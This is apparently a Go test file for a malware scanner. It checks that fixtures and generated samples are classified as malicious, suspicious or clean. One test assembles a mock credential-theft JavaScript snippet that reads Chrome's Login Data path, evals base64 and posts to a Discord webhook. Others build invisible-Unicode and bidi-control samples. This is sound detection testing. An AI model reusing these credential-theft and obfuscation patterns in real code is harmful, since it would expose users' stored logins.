// ©AngelaMos | 2026
// generic_test.go

package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/CarterPerez-dev/erinyes/internal/scan"
)

const genericDir = "../../testdata/generic"

func TestGenericFixtureVerdicts(t *testing.T) {
	want := map[string]struct {
		verdict    scan.Verdict
		confidence scan.Confidence
		signature  string
	}{
		"malicious/telemetry.py":       {scan.VerdictMalicious, scan.ConfidenceHigh, "generic-python-heuristics"},
		"malicious/package.json":       {scan.VerdictMalicious, scan.ConfidenceHigh, "npm-install-hook"},
		"malicious/.vscode/tasks.json": {scan.VerdictMalicious, scan.ConfidenceHigh, "vscode-autorun-task"},
		"malicious/Tool.csproj":        {scan.VerdictMalicious, scan.ConfidenceHigh, "msbuild-build-event"},
		"malicious/setup.ps1":          {scan.VerdictMalicious, scan.ConfidenceHigh, "script-download-execute"},
		"benign/.vscode/tasks.json":    {scan.VerdictSuspicious, scan.ConfidenceMedium, "vscode-autorun-task"},
		"benign/install.sh":            {scan.VerdictClean, scan.ConfidenceLow, "script-download-execute"},
		"benign/runner.py":             {scan.VerdictClean, scan.ConfidenceLow, "generic-python-heuristics"},
		"benign/App.csproj":            {scan.VerdictClean, scan.ConfidenceLow, "msbuild-build-event"},
		"benign/package.json":          {scan.VerdictClean, scan.ConfidenceLow, "npm-install-hook"},
	}

	results, _, err := scan.New(builtinCatalog(t)).ScanPath(context.Background(), genericDir)
	if err != nil {
		t.Fatalf("ScanPath() = %v", err)
	}
	for _, r := range results {
		rel, err := filepath.Rel(genericDir, r.FilePath)
		if err != nil {
			t.Fatal(err)
		}
		rel = filepath.ToSlash(rel)
		exp, tracked := want[rel]
		if !tracked {
			t.Errorf("untracked generic fixture %s: add it to the table", rel)
			continue
		}
		if r.Verdict != exp.verdict || r.Confidence != exp.confidence || r.Signature != exp.signature {
			t.Errorf("%s: got %s/%s via %s (score %d), want %s/%s via %s",
				rel, r.Verdict, r.Confidence, r.Signature, r.TotalScore, exp.verdict, exp.confidence, exp.signature)
		}
		delete(want, rel)
	}
	for missing := range want {
		t.Errorf("generic fixture %s was not scanned", missing)
	}
}

func TestNoGenericIndicatorCanFlagAFileAlone(t *testing.T) {
	for _, s := range builtinCatalog(t).All() {
		if s.Family != "Generic" {
			continue
		}
		for i := range s.Indicators {
			if s.Indicators[i].Weight >= s.ConfidenceThreshold {
				t.Errorf("%s: indicator %q weight %d alone clears the threshold of %d",
					s.ID, s.Indicators[i].Name, s.Indicators[i].Weight, s.ConfidenceThreshold)
			}
		}
	}
}

func scanGenerated(t *testing.T, name, content string) scan.ScanResult {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	results, _, err := scan.New(builtinCatalog(t)).ScanPath(context.Background(), filepath.Dir(path))
	if err != nil {
		t.Fatalf("ScanPath() = %v", err)
	}
	if len(results) != 1 {
		t.Fatalf("got %d results, want 1", len(results))
	}
	return results[0]
}

func TestInvisibleUnicodePayloadIsMalicious(t *testing.T) {
	var payload strings.Builder
	for i := 0; i < 150; i++ {
		payload.WriteRune(rune(0xE0100 + i%200))
	}
	src := "const s = `" + payload.String() + "`;\nconst base = 0xE0100;\n"
	r := scanGenerated(t, "decode.js", src)
	if r.Verdict != scan.VerdictMalicious || r.Signature != "invisible-unicode-source" {
		t.Errorf("verdict = %s via %s (score %d), want malicious via invisible-unicode-source", r.Verdict, r.Signature, r.TotalScore)
	}
}

func TestSingleBidiControlIsOnlyLowSignal(t *testing.T) {
	src := "label := \"abc" + string(rune(0x202E)) + "\"\n"
	r := scanGenerated(t, "label.go", src)
	if r.Verdict != scan.VerdictClean || r.Confidence != scan.ConfidenceLow {
		t.Errorf("verdict = %s/%s (score %d), want clean/low", r.Verdict, r.Confidence, r.TotalScore)
	}
}

func TestObfuscatedJavaScriptWithCredentialTheftIsMalicious(t *testing.T) {
	src := strings.Join([]string{
		"var _0x3f2a = ['x'];",
		"const p = home + '/Google/Chrome/User Data/Default/Login Data';",
		"eval(atob('Y29uc29sZS5sb2coMSk='));",
		"post('https://discord.com/api/webhooks/0/example-invalid');",
	}, "\n")
	r := scanGenerated(t, "index.js", src)
	if r.Verdict != scan.VerdictMalicious || r.Signature != "generic-javascript-heuristics" {
		t.Errorf("verdict = %s via %s (score %d), want malicious via generic-javascript-heuristics", r.Verdict, r.Signature, r.TotalScore)
	}
}

func TestMinifiedBundleShapeIsNotSuspicious(t *testing.T) {
	src := "!function(){var a=new Function('return this')();" + strings.Repeat("a.b=c(d,e);", 3000) + "}();\n"
	r := scanGenerated(t, "vendor.min.js", src)
	if r.Verdict != scan.VerdictClean {
		t.Errorf("verdict = %s (score %d): a minified bundle must not be suspicious on shape alone", r.Verdict, r.TotalScore)
	}
}

func TestFamilySignatureKeepsAttributionOverGeneric(t *testing.T) {
	data, err := os.ReadFile(filepath.Join(maliciousDir, "pymapper_template_spd980k.py"))
	if err != nil {
		t.Fatal(err)
	}
	r := scanGenerated(t, "fs.py", string(data))
	if r.Signature != "pymapper-fs-loader" {
		t.Errorf("signature = %s, want pymapper-fs-loader to keep the family label", r.Signature)
	}
}
